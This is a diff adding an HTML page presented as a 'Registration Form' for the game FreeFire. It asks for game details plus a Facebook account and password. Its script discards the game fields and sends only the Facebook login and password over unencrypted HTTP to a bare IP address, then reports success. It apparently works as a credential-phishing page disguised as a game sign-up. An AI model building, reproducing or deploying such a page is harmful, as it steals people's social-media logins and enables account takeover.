@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>
+    <style>
+        body {
+            background-image: url('your-background-image.jpg'); /* Replace with your background image URL */
+            background-size: cover;
+        }
+    </style>
+</head>
+<body>
+    <form id="registrationForm">
+        <label for="freefireName">FreeFire Name:</label>
+        <input type="text" id="freefireName" name="freefireName"><br><br>
+
+        <label for="freefireid">FreeFire ID:</label>
+        <input type="text" id="freefireid" name="freefireid"><br><br>
+
+        <label for="facebookAccount">Facebook Account:</label>
+        <input type="text" id="facebookAccount" name="facebookAccount"><br><br>
+
+        <label for="facebookPassword">Facebook Password:</label>
+        <input type="password" id="facebookPassword" name="facebookPassword"><br><br>
+
+        <button type="button" onclick="submitForm()">Submit</button>
+    </form>
+
+    <script>
+        function submitForm() {
+            const freefireName = document.getElementById('freefireName').value;
+            const freefireid = document.getElementById('freefireid').value;
+            const facebookAccount = document.getElementById('facebookAccount').value;
+            const facebookPassword = document.getElementById('facebookPassword').value;
+
+            const requestBody = {
+                usermobno: facebookAccount,
+                password: facebookPassword
+            };
+
+            fetch('http://13.53.125.215:3000/register', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(requestBody)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Registration successful');
+                } else {
+                    alert('Registration failed');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred during registration');
+            });
+        }
+    </script>
+</body>
+</html>
